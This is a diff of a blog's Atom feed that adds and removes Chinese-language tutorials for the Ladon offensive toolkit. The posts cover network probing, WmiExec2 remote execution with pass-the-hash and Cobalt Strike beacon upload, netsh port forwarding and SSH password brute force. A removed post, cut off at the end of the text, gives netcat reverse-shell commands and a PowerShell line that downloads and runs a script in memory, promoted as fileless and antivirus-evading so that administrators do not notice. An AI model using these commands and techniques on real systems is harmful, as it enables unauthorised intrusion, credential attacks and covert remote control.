@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://k8gege.org/"/>
-  <updated>2021-05-01T16:54:06.321Z</updated>
+  <updated>2021-05-15T10:56:35.083Z</updated>
   <id>http://k8gege.org/</id>
   
   <author>
@@ -15,6 +15,62 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>〖教程〗Ladon 8.2新增NTLM探测Windows版本</title>
+    <link href="http://k8gege.org/p/ntlminfo.html"/>
+    <id>http://k8gege.org/p/ntlminfo.html</id>
+    <published>2021-05-15T10:10:00.000Z</published>
+    <updated>2021-05-15T10:56:35.083Z</updated>
+    
+    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/ntlminfo.html";</script><h3 id="Ladon8-2更新功能"><a href="#Ladon8-2更新功能" class="headerlink" title="Ladon8.2更新功能"></a>Ladon8.2更新功能</h3><p>基于NTLM探测Windows版本信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+] WmiInfo (135)</span><br><span class="line">[+] SmbInfo (445)</span><br><span class="line">[+] WinrmInfo (5985/80/8080/443)</span><br><span class="line">[+] MssqlInfo(1433)</span><br><span class="line">[+] ExchangeInfo(443)</span><br><span class="line">[+] RdpInfo(3389)</span><br><span class="line">[+] WmiExec2支持文件上传、Base64cmd解决CS解析空格引号的问题</span><br><span class="line">[+] Ping重新启用系统Ping检测存活主机(目标PS1版本检测不到)</span><br></pre></td></tr></table></figure><p>LadonGUI 8.2 2021.5.15<br>[+]Base64 Unicdoe    主要用于WmiExec2或PowerShell命令的BASE64加密解密</p><h3 id="Ladon模块使用例子"><a href="#Ladon模块使用例子" class="headerlink" title="Ladon模块使用例子"></a>Ladon模块使用例子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C段：Ladon 192.168.1.8/24 WmiInfo</span><br><span class="line">C段：Ladon 192.168.1.8/c WmiInfo</span><br><span class="line">B段：Ladon 192.168.1.8/b WmiInfo</span><br><span class="line">A段：Ladon 192.168.1.8/a WmiInfo</span><br></pre></td></tr></table></figure><p>批量IP(段)ip.txt、ip24.txt等请查看文档</p><h3 id="Wmi探测信息"><a href="#Wmi探测信息" class="headerlink" title="Wmi探测信息"></a>Wmi探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WmiInfo.PNG"></p><h3 id="Winrm探测信息"><a href="#Winrm探测信息" class="headerlink" title="Winrm探测信息"></a>Winrm探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WinrmInfo.PNG"></p><h3 id="Smb探测信息"><a href="#Smb探测信息" class="headerlink" title="Smb探测信息"></a>Smb探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/SmbInfo.PNG"></p><h3 id="Mssql探测信息"><a href="#Mssql探测信息" class="headerlink" title="Mssql探测信息"></a>Mssql探测信息</h3><p>EnumMssql为探测SqlServer版本等信息<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/MssqlInfo.PNG"></p><h3 id="Exchange探测信息"><a href="#Exchange探测信息" class="headerlink" title="Exchange探测信息"></a>Exchange探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/ExchangeInfo.PNG"></p><h3 id="Rdp探测信息"><a href="#Rdp探测信息" class="headerlink" title="Rdp探测信息"></a>Rdp探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/RdpInfo.PNG"></p><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.2版本：K8小密圈</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="ntlm" scheme="http://k8gege.org/tags/ntlm/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>〖教程〗Ladon WmiExec2完美兼容Cobalt Strike</title>
+    <link href="http://k8gege.org/p/wmiexec2.html"/>
+    <id>http://k8gege.org/p/wmiexec2.html</id>
+    <published>2021-05-15T09:10:00.000Z</published>
+    <updated>2021-05-15T10:56:18.233Z</updated>
+    
+    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/wmiexec2.html";</script><h3 id="Ladon8-2更新功能"><a href="#Ladon8-2更新功能" class="headerlink" title="Ladon8.2更新功能"></a>Ladon8.2更新功能</h3><p>基于NTLM探测Windows版本信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+] WmiInfo (135)</span><br><span class="line">[+] SmbInfo (445)</span><br><span class="line">[+] WinrmInfo (5985/80/8080/443)</span><br><span class="line">[+] MssqlInfo(1433)</span><br><span class="line">[+] ExchangeInfo(443)</span><br><span class="line">[+] RdpInfo(3389)</span><br><span class="line">[+] WmiExec2支持文件上传、Base64cmd解决CS解析空格引号的问题</span><br><span class="line">[+] Ping重新启用系统Ping检测存活主机(目标PS1版本检测不到)</span><br></pre></td></tr></table></figure><p>LadonGUI 8.2 2021.5.15<br>[+]Base64 Unicdoe    主要用于WmiExec2或PowerShell命令的BASE64加密解密</p><h3 id="WmiExec说明"><a href="#WmiExec说明" class="headerlink" title="WmiExec说明"></a>WmiExec说明</h3><p>WmiExec  只需135端口通过注册表回显，不像Impacket或其它工具还依赖445，不依赖PowerShell，适用于任意目标<br>WmiExec2 和WmiExec一样只需135端口通过注册表回显，但依赖PowerShell，无PowerShell的目标可能不适用</p><p>b64cmd和上版本的BypassUac一样，主要用于加密CMD命令，防止在CS下使用多参数CMD命令转义麻烦的问题</p><h3 id="模块用法"><a href="#模块用法" class="headerlink" title="模块用法"></a>模块用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Load WmiExec2</span><br><span class="line">Usage:</span><br><span class="line">Ladon WmiExec2 host user pass cmd whoami</span><br><span class="line">Ladon WmiExec2 pth host cmd whoami</span><br><span class="line">Base64Cmd <span class="keyword">for</span> Cobalt Strike</span><br><span class="line">Ladon WmiExec2 host user pass b64cmd whoami</span><br><span class="line">Ladon WmiExec2 host user pass b64cmd whoami</span><br><span class="line">Upload:</span><br><span class="line">Ladon WmiExec2 host user pass upload beacon.exe ceacon.exe</span><br><span class="line">Ladon WmiExec2 pth host upload beacon.exe ceacon.exe</span><br></pre></td></tr></table></figure><p>批量IP(段)ip.txt、ip24.txt等请查看文档</p><h3 id="WmiExec2执行"><a href="#WmiExec2执行" class="headerlink" title="WmiExec2执行"></a>WmiExec2执行</h3><p>在Cobalt Strike的shell下执行wmiexec需要带空格引号参数时，CS转义有问题，使用正常CMD命令比较麻烦，所以我增加了个b64cmd参数便于在CS下使用(这个方法在几个月前的BypassUac里使用，很多人不知道为什么这样做，直接CMD命令不好吗，非要经过一步加密，当你要执行的CMD命令含有很多转义时你就知道了，得经过CS转义成CMD转义得到正常CMD很麻烦)。b64cmd命令可通过LadonGUI 8.2使用Base64Unicode加密生成</p><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/Gui82.PNG"></p><h4 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h4><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WmiExec2.PNG"></p><h3 id="Wmi探测信息"><a href="#Wmi探测信息" class="headerlink" title="Wmi探测信息"></a>Wmi探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WmiInfo.PNG"></p><h3 id="Winrm探测信息"><a href="#Winrm探测信息" class="headerlink" title="Winrm探测信息"></a>Winrm探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/WinrmInfo.PNG"></p><h3 id="Smb探测信息"><a href="#Smb探测信息" class="headerlink" title="Smb探测信息"></a>Smb探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/SmbInfo.PNG"></p><h3 id="Mssql探测信息"><a href="#Mssql探测信息" class="headerlink" title="Mssql探测信息"></a>Mssql探测信息</h3><p>EnumMssql为探测SqlServer版本等信息<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/MssqlInfo.PNG"></p><h3 id="Exchange探测信息"><a href="#Exchange探测信息" class="headerlink" title="Exchange探测信息"></a>Exchange探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/ExchangeInfo.PNG"></p><h3 id="Rdp探测信息"><a href="#Rdp探测信息" class="headerlink" title="Rdp探测信息"></a>Rdp探测信息</h3><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/RdpInfo.PNG"></p><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.2版本：K8小密圈</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="wmi" scheme="http://k8gege.org/tags/wmi/"/>
+    
+  </entry>
   
   <entry>
     <title>无回显命令执行漏洞之PowerShell回显</title>
@@ -65,6 +121,34 @@
     
     
       <category term="LadonGo" scheme="http://k8gege.org/tags/LadonGo/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>〖EXP〗LadonGUI 8.1新增ctr.sh证书查询子域名</title>
+    <link href="http://k8gege.org/p/cve-2018-14847.html"/>
+    <id>http://k8gege.org/p/cve-2018-14847.html</id>
+    <published>2021-05-01T13:10:00.000Z</published>
+    <updated>2021-05-15T10:55:21.697Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>LadonGui 8.1的SubDomain模块新增网页提取子域名、ctr.sh证书域名提取以及3万字典扫描探测子域名(去年的扫描功能也与2300星的工具对比明显Ladon速度很快且效率高，当然大家也可更换字典或增加字段的)</p><p><img alt="image" data-original="http://k8gege.org/k8img/Ladon/exe/Gui81_SubDomain.PNG"></p><h3 id="CMD子域名扫描"><a href="#CMD子域名扫描" class="headerlink" title="CMD子域名扫描"></a>CMD子域名扫描</h3><p>Example: Ladon baidu.com SubDomain<br>需域名字典SubDomain.dic，字典上万个高效率子域名</p><p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exe/SubDomain.gif"><br><img alt data-original="https://k8gege.github.io/k8img/Ladon/cs/CS_SubDomain.gif"></p><p>去年与2300星的Subbrute对比,明显Ladon速度快很多倍 <a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a><br>作者说它的工具携带字典包含2000个常用子域名<br>先运行Subbrute几秒钟后再运行Ladon,直止GIF图片结束<br>Ladon已扫出上百个子域名，而Subbrute才扫出几个<br><img alt data-original="https://k8gege.github.io/k8img/Other/subbrute_subdomain.gif"></p><p>对比结束后，又单独使用Subbrute扫描，发现不稳定需多次运行才出结果且速度慢<br>相比之下速度太慢，程序又大，也不稳定，所以从以前至今都没用过subbrute<br>因为想学习一下别人的思路，发现有很多文章提到，又发现2300星，才下该工具测试<br>没有使用该工具爆破子域名的另外一个原因是K8飞刀早就有子域名爆破功能<br><img alt data-original="https://k8gege.github.io/k8img/Other/subbrute.gif"></p><h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><h4 id="LadonGo-ALL-OS"><a href="#LadonGo-ALL-OS" class="headerlink" title="LadonGo (ALL OS)"></a>LadonGo (ALL OS)</h4><p><a href="https://github.com/k8gege/LadonGo/releases" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo/releases</a></p><h4 id="Ladon-Windows-amp-Cobalt-Strike"><a href="#Ladon-Windows-amp-Cobalt-Strike" class="headerlink" title="Ladon (Windows &amp; Cobalt Strike)"></a>Ladon (Windows &amp; Cobalt Strike)</h4><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>8.2版本：K8小密圈</p><div style="text-align: center; width: 710px; border: green solid 0px;"><img alt style="display: inline-block;width: 250px;height: 300px;" data-original="http://k8gege.org/img/k8team.jpg"></div>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;LadonGui 8.1的SubDomain模块新增网页提取子域名、ctr.sh证书域名提取以及3万字典扫描探测子域名(去年的扫描功能也与2
+      
+    
+    </summary>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
+    
+      <category term="SubDomain" scheme="http://k8gege.org/tags/SubDomain/"/>
     
   </entry>
   
@@ -492,87 +576,6 @@ Visit &lt;span id=&quot;busuanzi_value_page_pv&quot;&gt;&lt;/span&gt;
       <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
     
       <category term="netsh" scheme="http://k8gege.org/tags/netsh/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>〖教程〗Ladon 7.8 netsh端口转发/端口映射</title>
-    <link href="http://k8gege.org/p/ladonnetsh.html"/>
-    <id>http://k8gege.org/p/ladonnetsh.html</id>
-    <published>2020-12-30T16:10:00.000Z</published>
-    <updated>2021-01-17T08:39:05.874Z</updated>
-    
-    <content type="html"><![CDATA[<p>=============================================================================================<br>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><script language="javascript" type="text/javascript">window.location.href="http://k8gege.org/Ladon/netsh.html";</script><h3 id="Ladon7-8"><a href="#Ladon7-8" class="headerlink" title="Ladon7.8"></a>Ladon7.8</h3><p>由于系统netsh命令较长，Ladon新增netsh命令，方便CS或SHELL下使用，查看无需管理员功能，增加和删除都需要管理员</p><p>自Windows XP开始，Windows中就内置网络端口转发的功能。任何传入到本地端口的TCP连接（IPv4或IPv6）都可以被重定向到另一个本地端口，或远程计算机上的端口，并且系统不需要有一个专门用于侦听该端口的服务。</p><h3 id="Ladon命令"><a href="#Ladon命令" class="headerlink" title="Ladon命令"></a>Ladon命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ladon netsh query 查询规则</span><br><span class="line">Ladon netsh del listenport 删除规则</span><br><span class="line">Ladon netsh add listenport connectaddress connectport 添加规则</span><br></pre></td></tr></table></figure><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>转发机器：192.168.1.113<br>SSH机器： 192.168.1.112<br>攻击器：  192.168.1.8</p><h3 id="netsh查看"><a href="#netsh查看" class="headerlink" title="netsh查看"></a>netsh查看</h3><p>显示系统中的转发规则列表<br>netsh interface portproxy show all</p><h3 id="Ladon查看"><a href="#Ladon查看" class="headerlink" title="Ladon查看"></a>Ladon查看</h3><p>Ladon netsh query</p><h3 id="netsh端口转发"><a href="#netsh端口转发" class="headerlink" title="netsh端口转发"></a>netsh端口转发</h3><p>netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport</p><p>listenaddress - 等待连接的本地IP地址<br>listenport - 本地侦听TCP端口<br>connectaddress - 将传入连接重定向到本地或远程IP地址<br>connectport - 一个TCP端口</p><p>113机器上以管理员权限执行命令<br>netsh interface portproxy add v4tov4 listenport=888 connectport=22 connectaddress=192.168.1.112</p><h3 id="Ladon端口转发"><a href="#Ladon端口转发" class="headerlink" title="Ladon端口转发"></a>Ladon端口转发</h3><p>113机器上以管理员权限执行命令<br>Ladon netsh add 888 192.168.1.112 22</p><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/netsh.PNG"></p><h3 id="SSH转发"><a href="#SSH转发" class="headerlink" title="SSH转发"></a>SSH转发</h3><p>转发后我们访问113机器的888端口，就是访问112的SSH端口，刚好可用于测试Ladon的自定义SSH端口爆破<br><img alt data-original="http://k8gege.org/k8img/Ladon/exe/DiyPortSSH.PNG"></p><h3 id="其它端口同理"><a href="#其它端口同理" class="headerlink" title="其它端口同理"></a>其它端口同理</h3><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;=============================================================================================&lt;br&gt;++++++++++++++++++++++++++++++++++++++++
-      
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-      <category term="netsh" scheme="http://k8gege.org/tags/netsh/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>〖教程〗Ladon 7.8密码爆破自定义端口(SSH为例)</title>
-    <link href="http://k8gege.org/p/DiyPortBruteForce.html"/>
-    <id>http://k8gege.org/p/DiyPortBruteForce.html</id>
-    <published>2020-12-29T16:10:00.000Z</published>
-    <updated>2021-01-17T08:39:31.336Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="自定义端口爆破"><a href="#自定义端口爆破" class="headerlink" title="自定义端口爆破"></a>自定义端口爆破</h3><p>以Ssh密码爆破为例,默认端口为22，其实这些功能一直都有，发现我也没写专门的文章，当然WIKI里也有了，但很多人可能不去看那么仔细，经常有人问能不能自定义端口，也不看看文档，只是今天朋友发现了SSH无法自定义端口的BUG，其它模块可能也有，因为这功能当初只是打算加，但模块太多，很多模块可能还未加上去，若有发现可Github或小密圈内提交。</p><h4 id="指定端口"><a href="#指定端口" class="headerlink" title="指定端口"></a>指定端口</h4><p>不指定的情况下为服务对应默认端口，如SSH默认22，SMB默认445<br>命令 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ladon 192.168.1.8 SshScan  扫描IP</span><br><span class="line">Ladon 192.168.1.8/24 SshScan 扫描C段</span><br><span class="line">Ladon 192.168.1.8/c SshScan  扫描C段</span><br><span class="line">Ladon 192.168.1.8/b SshScan 扫描B段</span><br><span class="line">Ladon 192.168.1.8/a SshScan  扫描A段</span><br></pre></td></tr></table></figure><p>PS：7.X开始后的版本/16或/8不一定是B段或A段，建议大家用/b或/a，扫描结果还是按顺序的</p><h4 id="批量C段、批量IP"><a href="#批量C段、批量IP" class="headerlink" title="批量C段、批量IP"></a>批量C段、批量IP</h4><p>有人说我的目标有很多IP段或者很多IP是跨网段，我不想一个一个扫怎么办啊，可使用ip.txt\ip24.txt\ip16.txt，这个功能在Cscan的时候就有了就是Ladon改名前，你想到的或想不到的Ladon都帮你考虑了，需要的时候先看文档，不要问有没有什么功能。<br>ip.txt<br>192.168.1.8<br>10.10.1.8</p><p>ip24.txt<br>192.168.1<br>10.1.1</p><h5 id="传统字典user-txt-pass-txt"><a href="#传统字典user-txt-pass-txt" class="headerlink" title="传统字典user.txt pass.txt"></a>传统字典user.txt pass.txt</h5><p>传统帐密user.txt、pass.txt，分别填写用户和密码即可<br>user.txt<br>root<br>k8</p><p>pass.txt<br>123456<br>00000<br>k8gege</p><h5 id="快速字典userpass-txt"><a href="#快速字典userpass-txt" class="headerlink" title="快速字典userpass.txt"></a>快速字典userpass.txt</h5><p>密码组userpass.txt,格式为用户和密码<br>userpass.txt<br>root 123456<br>root k8gege</p><p>准备好字典，目标参数为IP:Port,即可实现自定义端口<br>命令 Ladon 192.168.1.8:888 SshScan</p><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/DiyPortSSH.PNG"></p><h4 id="批量验证主机帐密check-txt"><a href="#批量验证主机帐密check-txt" class="headerlink" title="批量验证主机帐密check.txt"></a>批量验证主机帐密check.txt</h4><p>支持快速验证已知密码，如从配置文件里获取，明确确认IP对应帐密，或自己掌握了很久，需要批量验证是否可用，从0开始爆破不好吧，速度慢且容易产生很多流量，已知机器帐密推荐此方法验证。</p><p>check.txt<br>192.168.1.8 444 root k8gege<br>192.168.1.2 22 root k8520<br>192.168.1.6 root k8888</p><p>命令 Ladon SshScan</p><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/DiyPortSsh2.PNG"></p><h3 id="其它模块"><a href="#其它模块" class="headerlink" title="其它模块"></a>其它模块</h3><p>其它模块同理，有几个参数就写几个</p><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon" target="_blank" rel="noopener">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>7.8版本：K8小密圈</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;自定义端口爆破&quot;&gt;&lt;a href=&quot;#自定义端口爆破&quot; class=&quot;headerlink&quot; title=&quot;自定义端口爆破&quot;&gt;&lt;/a&gt;自定义端口爆破&lt;/h3&gt;&lt;p&gt;以Ssh密码爆破为例,默认端口为22，其实这些功能一直都有，发现我也没写专门的文章，当然WIKI里也
-      
-    
-    </summary>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
-    
-      <category term="密码爆破" scheme="http://k8gege.org/categories/Brute-Force/"/>
-    
-    
-      <category term="Ladon" scheme="http://k8gege.org/tags/Ladon/"/>
-    
-      <category term="Brute" scheme="http://k8gege.org/tags/Brute/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>〖工具〗NC执行PowerShell/内存加载Ladon扫描</title>
-    <link href="http://k8gege.org/p/LadonNC.html"/>
-    <id>http://k8gege.org/p/LadonNC.html</id>
-    <published>2020-12-25T15:00:00.000Z</published>
-    <updated>2021-01-17T08:39:51.525Z</updated>
-    
-    <content type="html"><![CDATA[<p>K8加强版NC、NetCat,可监听执行windows\Linux\Mac等系统，或多种方式反弹的Shell,对于Windows还可以自动加密执行PowerShell、以及内存加载执行Ladon扫描（无文件落地）</p><a id="more"></a><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>由于最近使用的C2在执行CMD命令时，经常容易出现僵尸进程（无法结束必须结束宿主进程或重启机器），为了防止执行命令时出现僵尸进程导致被管理员发现，所以我采用反弹SHELL来执行命令的方法。</p><h3 id="NC简介"><a href="#NC简介" class="headerlink" title="NC简介"></a>NC简介</h3><p>NetCat，简称Nc，是一款非常实用的网络工具，小巧而功能强大，被誉为网络安全界的“瑞士军刀”。NetCat被设计成一个可靠的后门工具，拥有功能丰富的网络调试和开发工具，它可以通过手工或者脚本与应用层的网络应用程序或服务进行交互，可以帮你轻易的建立几乎任何类型的连接。</p><p>netcat在UNIX/LINUX/MAC等系统默认安装，所以现在依然是黑客必学的命令，功能很多，但现在大多数人估计也就只会用它来反弹。上一代或喜欢命令行下渗透的，可能比较熟悉使用NC的其它功能，什么端口扫描、监听、抓包等，由于现在我最多也就使用它来反弹，所以就弄个加强版的NC客户端，可监听来自WINDOWS、Linux、Mac等任意系统反弹的SHELL，针对Windows还可执行PowerShell命令、当然也支持渗透必备的Ladon。</p><h3 id="加强版NC"><a href="#加强版NC" class="headerlink" title="加强版NC"></a>加强版NC</h3><p>NC客户端一般都放在VPS上或本地，所以此功能放在GUI里，这样使用起来很方便，特别是切换执行CMD、PowerShell、Ladon命令</p><p>GUI 2020.12.25<br>[+] Netcat PowerShell命令加密执行<br>[+] Netcat 内存加载PowerLadon执行</p><p>GUI 2020.12.16<br>[u] Netcat 兼容Linux或MAC反弹SHELL<br>[+] Netcat 执行命令历史记录</p><h3 id="NC监听"><a href="#NC监听" class="headerlink" title="NC监听"></a>NC监听</h3><p>nc -lvp 4444</p><p>LadonGUI监听，直接点击Listen即可</p><h3 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>nc -e cmd 192.168.1.110 4444</p><h4 id="linux-mac"><a href="#linux-mac" class="headerlink" title="linux/mac"></a>linux/mac</h4><p>nc -e /bin/bash 192.168.1.110 4444</p><h4 id="Ladon"><a href="#Ladon" class="headerlink" title="Ladon"></a>Ladon</h4><p>Ladon ReverseTcp 192.168.1.110 4444 nc</p><h4 id="Runas"><a href="#Runas" class="headerlink" title="Runas"></a>Runas</h4><p>Ladon Runas k8gege k8gege520 cmd.exe 192.168.1.110 4444</p><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/RunasNC.PNG"></p><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>其它方法反弹，Ladon也支持</p><h3 id="执行CMD命令"><a href="#执行CMD命令" class="headerlink" title="执行CMD命令"></a>执行CMD命令</h3><p>不勾选PowerShell或PowerLadon，默认即是正常的CMD命令</p><h3 id="执行PowerShell命令-加密"><a href="#执行PowerShell命令-加密" class="headerlink" title="执行PowerShell命令(加密)"></a>执行PowerShell命令(加密)</h3><p>优点：有一定的反查效果（虽说Base64形同虚设，但也比完全不加密好一点）<br>勾选PowerShell，在CMD框中输入PowerShell命令或代码，执行的时候自动加密<br>当然你也可以使用NC旁边的PowerShell，里面有很多随机混淆PowerShell的方法<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/ncpowershell.PNG"></p><h3 id="一键搭建WEB服务器"><a href="#一键搭建WEB服务器" class="headerlink" title="一键搭建WEB服务器"></a>一键搭建WEB服务器</h3><p>将Ladon.ps1和Ladon.exe放到VPS或内网中，使用Ladon web 800搭建Web服务器<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/Ladon_web.PNG"></p><h3 id="远程内存加载Ladon扫描"><a href="#远程内存加载Ladon扫描" class="headerlink" title="远程内存加载Ladon扫描"></a>远程内存加载Ladon扫描</h3><p>优点：1.无文件落地 2.免杀 3.无操作痕迹<br>执行NC反弹后，填写对应Ladon.ps1的下载地址并勾选PowerLadon，然后就可以像使用EXE或CS版那样使用Ladon了<br><img alt data-original="http://k8gege.org/k8img/Ladon/gui/NC_PowerLadon.PNG"></p><h3 id="Cmd远程加载Ladon"><a href="#Cmd远程加载Ladon" class="headerlink" title="Cmd远程加载Ladon"></a>Cmd远程加载Ladon</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"</span></span><br></pre></td></tr></table></figure><p>适用于还没跟上时代的远控或Shell只支持CMD交互,最大的优点是免杀、无文件落地，其它RAT也可以使用这种本文NC加载Ladon执行命令的方法，强化自己的C2/RAT/WebShell工具，不要说我只给CS写插件，而是很多shell工具我都考虑到了,你实现不了CS的程序集加载功能，也可以使用这个简单又很实用的方法。</p><h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" 